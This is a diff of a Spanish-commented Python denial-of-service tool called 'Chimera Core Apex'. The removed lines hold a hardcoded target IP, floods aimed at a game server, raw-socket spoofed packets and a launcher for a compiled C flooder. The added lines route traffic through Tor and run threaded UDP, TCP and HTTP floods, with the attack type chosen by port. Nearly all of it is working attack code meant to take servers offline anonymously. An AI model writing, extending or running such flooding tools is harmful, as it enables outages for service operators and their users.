@@ -1,171 +1,149 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# Chimera_Core_Apex - El cerebro estratégico del ataque definitivo
-
+import socket
+import threading
+import time
 import os
 import sys
-import time
 import random
-import socket
-import subprocess
-import threading
 import struct
-import signal
+import socks
+import requests
+from concurrent.futures import ThreadPoolExecutor
 
-# --- CONFIGURACIÓN GLOBAL ---
-TARGET_IP = "51.161.47.99"  # <-- ¡¡¡CAMBIA ESTO POR LA IP REAL!!!
-TARGET_PORT = 7777
-ATTACK_DURATION = 1800  # 30 minutos de aniquilación total
+# Configuración de Tor para anonimato
+socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+socket.socket = socks.socksocket
 
-# --- VARIABLES GLOBALES DE CONTROL ---
+# Variables globales para el ataque
 stop_event = threading.Event()
+packet_count = 0
+lock = threading.Lock()
 
-def signal_handler(sig, frame):
-    """Manejador para detener el ataque limpiamente con Ctrl+C."""
-    print("\n[CHIMERA CORE APEX] Abortando operación por comando del usuario.")
-    stop_event.set()
-    time.sleep(2)
-    print("[CHIMERA CORE APEX] Operación finalizada.")
-    sys.exit(0)
-
-# --- FASE DE DESPLIEGUE DE ATAQUE APEX ---
-def deploy_apex_attack(target_ip, target_port, duration):
-    """Orquesta el lanzamiento del ataque definitivo con todos los módulos."""
-    signal.signal(signal.SIGINT, signal_handler)
-    print("=" * 80)
-    print("     PROYECTO CHIMERA APEX - ECOSISTEMA DE ATAQUE DEFINITIVO")
-    print("Este no es un script. Es una plataforma de aniquilación modular.")
-    print("=" * 80)
-    print(f"Objetivo Final: {target_ip}:{target_port}")
-    print(f"Duración: {duration} segundos")
-    print("=" * 80)
-
-    threads = []
-    beast_process = None
-
-    # --- Despliegue del Módulo Beast Apex (Músculo C Mejorado) ---
-    print("[CHIMERA CORE APEX] Desplegando CHIMERA_BEAST_APEX (músculo de bajo nivel mejorado)...")
-    try:
-        if not os.path.exists("chimera_beast_apex"):
-            print("[CHIMERA CORE APEX] Compilando Chimera_Beast_Apex.c...")
-            compile_result = subprocess.run(["gcc", "-O3", "-pthread", "chimera_beast_apex.c", "-o", "chimera_beast_apex"], capture_output=True, text=True)
-            if compile_result.returncode != 0:
-                print(f"[ERROR FATAL] Fallo al compilar Chimera_Beast_Apex.c: {compile_result.stderr}")
-                sys.exit(1)
-            print("[CHIMERA CORE APEX] Chimera_Beast_Apex compilado con éxito.")
-        
-        beast_cmd = ["./chimera_beast_apex", str(target_ip), str(target_port), str(duration)]
-        beast_process = subprocess.Popen(beast_cmd)
-        print("[CHIMERA CORE APEX] Chimera_Beast_Apex está ejecutando el ataque de bajo nivel.")
-    except Exception as e:
-        print(f"[ERROR] No se pudo desplegar Chimera_Beast_Apex: {e}")
-
-    # --- Despliegue del Módulo Hive Apex (Enjambre de exploits de aplicación) ---
-    print("[CHIMERA CORE APEX] Desplegando CHIMERA_HIVE_APEX (enjambre de exploits de aplicación)...")
-    # Aumentamos masivamente el número de hilos para cada exploit
-    attack_functions = {
-        "exploit_query_crash": 2500,      # Aumentado de 800 a 2500
-        "exploit_handshake_broken": 4000, # Aumentado de 1200 a 4000
-        "exploit_raksamp_freeze": 1500,   # Aumentado de 300 a 1500
-    }
-
-    for attack_name, thread_count in attack_functions.items():
-        if attack_name == "exploit_query_crash":
-            target_function = lambda ip, port, dur, ev: exploit_query_crash(ip, port, dur, ev)
-        elif attack_name == "exploit_handshake_broken":
-            target_function = lambda ip, port, dur, ev: exploit_handshake_broken(ip, port, dur, ev)
-        else: # raksamp_freeze
-            target_function = lambda ip, port, dur, ev: exploit_raksamp_freeze(ip, port, dur, ev)
-
-        print(f"[CHIMERA CORE APEX] Lanzando {thread_count} hilos de '{attack_name}'...")
-        for i in range(thread_count):
-            thread = threading.Thread(target=target_function, args=(target_ip, target_port, duration, stop_event), daemon=True)
-            threads.append(thread)
-            thread.start()
-            # Sin sleep entre hilos para máxima velocidad de despliegue
-
-    print(f"\n[CHIMERA CORE APEX] Todos los módulos desplegados. El objetivo está bajo asalto total.")
+def exploit_query_crash(target_ip, target_port, duration, thread_id):
+    """Función principal de ataque UDP con payloads personalizados"""
+    global packet_count
     
-    # --- Monitor de la Operación ---
-    start_time = time.time()
-    try:
-        while time.time() - start_time < duration and not stop_event.is_set():
-            time.sleep(15) # Reporte más frecuente
-            elapsed = time.time() - start_time
-            print(f"[CHIMERA CORE APEX] Tiempo de ataque: {elapsed:.0f}s / {duration}s. Manteniendo presión máxima.")
-            if beast_process and beast_process.poll() is not None:
-                print("[ADVERTENCIA] El proceso Chimera_Beast_Apex ha terminado prematuramente.")
-    finally:
-        print("[CHIMERA CORE APEX] Deteniendo todos los módulos...")
-        stop_event.set()
-        if beast_process:
-            beast_process.terminate()
-        time.sleep(5)
-        print("[CHIMERA CORE APEX] Operación Chimera Apex finalizada.")
-
-# --- Funciones de Explotación (Optimizadas para velocidad) ---
-def exploit_query_crash(target_ip, target_port, duration, stop_event):
-    start_time = time.time()
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0) # Sin buffer para envío instantáneo
-    while not stop_event.is_set() and (time.time() - start_time < duration):
+    end_time = time.time() + duration
+    
+    # Preparar payloads destructivos específicos para diferentes protocolos
+    payloads = [
+        b'\x00' * 1024,  # Paquete nulo básico
+        b'\xFF' * 1024,  # Paquete de bytes altos
+        b'\x41' * 1024,  # Paquete de caracteres 'A'
+        b'\x00\x01\x00\x00' + b'\x41' * 1020,  # Payload específico para RDP
+        b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00',  # Payload RDP
+        b'\x00' * 4 + b'\x41' * 1020,  # Payload con encabezado
+        os.urandom(1024),  # Payload aleatorio
+        struct.pack('!I', random.randint(0, 0xFFFFFFFF)) + b'\x41' * 1020  # Payload con número aleatorio
+    ]
+    
+    while not stop_event.is_set() and time.time() < end_time:
         try:
-            query_base = b"SAMP" + bytes.fromhex("".join([f"{int(b):02x}" for b in socket.inet_aton(target_ip)])) + target_port.to_bytes(2, 'big')
-            # Payload más grande y más aleatorio
-            malicious_payload = os.urandom(random.randint(200, 500))
-            full_packet = query_base + malicious_payload
-            sock.sendto(full_packet, (target_ip, target_port))
-        except Exception:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(1.0)
+            
+            # Enviar múltiples paquetes por iteración
+            for _ in range(5):
+                payload = random.choice(payloads)
+                try:
+                    sock.sendto(payload, (target_ip, target_port))
+                    with lock:
+                        packet_count += 1
+                except:
+                    pass
+            
+            sock.close()
+            time.sleep(0.001)  # Pequeño retraso para evitar sobrecarga local
+        except:
             pass
-    sock.close()
+    
+    print(f"Hilo {thread_id} completado. Paquetes enviados: {packet_count}")
 
-def exploit_handshake_broken(target_ip, target_port, duration, stop_event):
-    start_time = time.time()
-    while not stop_event.is_set() and (time.time() - start_time < duration):
+def tcp_flood_attack(target_ip, target_port, duration, thread_id):
+    """Ataque de inundación TCP con intentos de conexión"""
+    end_time = time.time() + duration
+    
+    while not stop_event.is_set() and time.time() < end_time:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.1) # Timeout mínimo para no bloquear
-            # Payload más grande y variado
-            sock.send(b"\xFF\xFF\x00" + os.urandom(random.randint(100, 300)))
+            sock.settimeout(0.5)
+            
+            # Intentar conectar y enviar datos
+            try:
+                sock.connect((target_ip, target_port))
+                sock.send(os.urandom(1024))
+            except:
+                pass
+            
             sock.close()
-        except Exception:
+            time.sleep(0.01)
+        except:
             pass
+    
+    print(f"Hilo TCP {thread_id} completado")
 
-def exploit_raksamp_freeze(target_ip, target_port, duration, stop_event):
-    """Versión mejorada que no usa Scapy para ahorrar recursos y ser más rápida."""
-    start_time = time.time()
-    try:
-        sd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        sd.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0) # Sin buffer
-    except PermissionError:
-        print("[ADVERTENCIA] No se pudo crear socket raw para exploit_raksamp_freeze. Necesitas ser root.")
-        return
-
-    target_port_struct = struct.pack('!H', target_port)
-    while not stop_event.is_set() and (time.time() - start_time < duration):
+def http_flood_attack(target_ip, target_port, duration, thread_id):
+    """Ataque HTTP/HTTPS para sobrecargar servidores web"""
+    end_time = time.time() + duration
+    protocol = "https" if target_port == 443 else "http"
+    url = f"{protocol}://{target_ip}:{target_port}/"
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Connection': 'keep-alive',
+    }
+    
+    while not stop_event.is_set() and time.time() < end_time:
         try:
-            # Payload malicioso más grande
-            payload = b'\xC7' + b'!freeze' + os.urandom(400)
-            
-            # Construir paquete IP + UDP + Payload manualmente
-            ip_header = struct.pack('!BBHHHBBH4s', 69, 0, 0, 0, 0, 255, socket.IPPROTO_UDP, 0, socket.inet_aton(target_ip))
-            udp_header = struct.pack('!HHHH', random.randint(1024, 65535), target_port, 8 + len(payload), 0)
-            
-            packet = ip_header + udp_header + payload
-            
-            sd.sendto(packet, (target_ip, 0))
-        except Exception:
+            requests.get(url, headers=headers, timeout=1)
+            time.sleep(0.1)
+        except:
             pass
-    sd.close()
+    
+    print(f"Hilo HTTP {thread_id} completado")
 
-# --- FUNCIÓN PRINCIPAL ---
 def main():
-    if os.geteuid() != 0:
-        print("[ERROR CRÍTICO] Ejecuta como root (sudo).")
+    if len(sys.argv) < 4:
+        print("Uso: python3 Chimera_Core_Apex.py <IP> <PUERTO> <DURACION>")
+        print("Ejemplo: python3 Chimera_Core_Apex.py 192.168.1.1 80 60")
         sys.exit(1)
-        
-    # Despliegue directo del ataque
-    deploy_apex_attack(TARGET_IP, TARGET_PORT, ATTACK_DURATION)
+    
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2])
+    duration = int(sys.argv[3])
+    
+    print(f"Iniciando ataque contra {target_ip}:{target_port} durante {duration} segundos")
+    print("Presiona Ctrl+C para detener el ataque")
+    
+    # Determinar qué tipo de ataque usar según el puerto
+    attack_type = "udp"
+    if target_port in [80, 443, 8080, 8000]:
+        attack_type = "http"
+    elif target_port in [21, 22, 23, 25, 53, 110, 143, 993, 995]:
+        attack_type = "tcp"
+    
+    # Crear y comenzar hilos de ataque
+    with ThreadPoolExecutor(max_workers=200) as executor:
+        if attack_type == "udp":
+            for i in range(150):
+                executor.submit(exploit_query_crash, target_ip, target_port, duration, i)
+        elif attack_type == "tcp":
+            for i in range(100):
+                executor.submit(tcp_flood_attack, target_ip, target_port, duration, i)
+        elif attack_type == "http":
+            for i in range(50):
+                executor.submit(http_flood_attack, target_ip, target_port, duration, i)
+    
+    try:
+        time.sleep(duration)
+        stop_event.set()
+    except KeyboardInterrupt:
+        print("\nAtaque detenido por el usuario")
+        stop_event.set()
+    
+    print(f"Ataque completado. Total de paquetes enviados: {packet_count}")
 
 if __name__ == "__main__":
     main()
